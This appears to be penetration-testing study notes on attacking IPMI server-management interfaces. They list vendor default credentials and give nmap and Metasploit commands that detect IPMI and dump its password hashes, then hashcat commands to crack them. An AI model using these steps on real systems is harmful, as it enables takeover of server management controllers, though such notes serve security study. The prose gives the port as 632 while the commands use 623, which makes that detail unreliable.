---

---
---
### Intelligent Platform Management Interface (IPMI)

IPMI is a hardware-based host management system for system monitoring and administration. It operates independently of the OS, firmware, BIOS or CPU providing low-level management capabilities. **Port 632/UDP** is used for IPMI communication.

Common default credentials
	- Dell iDRAC: `root`:`calvin`
	- HP iLO: `administrator`: Randomized 8-char string (uppercase/numbers)
	- Supermictro IPMI: `ADMIN`:`ADMIN`


#### Footprinting IPMI Services
---
1. Detecting IPMI services
```bash
	nmap -sU --script ipmi-version -p 623 <target>
```

2. Metasploit scanning
```bash
	use auxiliary/scanner/ipmi/ipmi_version
	set rhost <target_ip>
```

3. Dumping IPMI hashes
```bash
	use auxiliary/scanner/ipmi/ipmi_dumphashes
	set rhost <target_ip>
```

4. Offline Hash Cracking
	- Use hashcat (mode `7300` for IPMI hashes)
```bash
	hashcat -m 7300 <hashfile> <wordlist>
```

- For HP iLO default password
```bash
	hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```